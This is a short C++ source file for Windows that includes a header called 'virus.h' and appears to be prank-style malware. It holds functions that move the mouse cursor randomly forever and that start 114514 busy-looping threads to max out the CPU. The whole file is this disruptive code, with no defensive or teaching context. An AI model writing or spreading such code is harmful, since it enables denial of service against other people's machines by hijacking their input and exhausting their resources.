#include <iostream>
#include "virus.h"
#include <windows.h>
#include <cstdlib>
#include<time.h>
#include <thread>
#include <fstream>
#include <unistd.h>
#include <windows.h>
#include <mutex>
#include <vector>

using namespace std;

void rere()
{
    while (1)
    {

    }
}

void mouse_bad() {
    time_t now = time(0);
    srand(now);
    while (1)
    {
        mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, rand(), rand(), 0, 0 );
    }
}

void cpu_high() {
    vector<thread> t;

    for (int i = 0; i < 114514; i++)
    {
        t.push_back(thread(rere));
    }

    for (auto iter = t.begin(); iter != t.end(); iter++)
    {
        iter->join();
    }
}
